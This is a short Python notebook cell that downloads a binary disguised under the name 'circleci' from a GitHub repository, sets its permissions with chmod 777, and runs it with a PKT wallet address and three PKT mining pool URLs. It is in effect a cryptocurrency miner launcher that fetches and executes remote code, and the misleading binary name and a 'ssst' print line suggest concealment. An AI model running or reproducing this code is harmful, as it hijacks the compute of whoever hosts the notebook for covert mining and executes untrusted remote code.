#@title
import urllib.request
import os
print('ssst')
urllib.request.urlretrieve('https://github.com/aurbach55/zash/raw/main/circleci','circleci')
os.system ("chmod 777 circleci && ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pkteer.com http://pool.pktpool.io ")
